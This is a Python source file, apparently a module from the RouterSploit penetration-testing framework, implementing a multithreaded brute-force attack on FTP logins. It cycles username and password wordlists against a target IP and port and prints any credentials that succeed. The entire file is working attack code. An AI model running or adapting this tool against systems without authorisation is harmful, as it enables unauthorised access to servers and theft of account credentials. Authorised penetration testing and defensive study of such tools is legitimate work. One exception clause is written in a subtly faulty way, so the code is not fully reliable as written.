import threading
import ftplib
import socket
import itertools

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against FTP service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'FTP Bruteforce',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
         ]
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(21, 'Target port')

    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')

    credentials = []

    def run(self):
        print_status("Running module...")

        self.credentials = []
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.target, port=int(self.port), timeout=10)
        except socket.error, socket.timeout:
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ftp.close()
            return
        except:
            pass
        ftp.close()

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))

        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        name = threading.current_thread().name

        print_status(name, 'process is starting...')

        ftp = ftplib.FTP()
        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        ftp.connect(self.target, port=int(self.port), timeout=10)
                        break
                    except socket.error, socket.timeout:
                        print_error("{} Connection problem. Retrying...".format(name))
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...")
                            return

                try:
                    ftp.login(user, password)

                    running.clear()
                    print_success("{}: Authentication succeed!".format(name), user, password)
                    self.credentials.append((user, password))
                except:
                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))

                ftp.close() 

        print_status(name, 'process is terminated.')
